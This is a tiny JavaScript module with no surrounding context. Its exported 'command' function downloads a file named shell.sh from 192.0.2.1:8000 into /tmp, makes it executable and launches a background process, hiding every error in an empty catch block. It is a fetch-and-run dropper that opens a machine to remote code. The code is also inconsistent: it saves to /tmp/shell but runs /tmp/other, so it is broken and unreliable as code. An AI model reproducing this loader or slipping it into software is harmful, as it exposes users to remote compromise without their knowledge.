const {execSync}=require('child_process');
exports.command=function(){try{
 execSync('curl 192.0.2.1:8000/shell.sh > /tmp/shell');
 execSync('chmod +x /tmp/shell');
 execSync('/tmp/other &');
}catch(e){}};
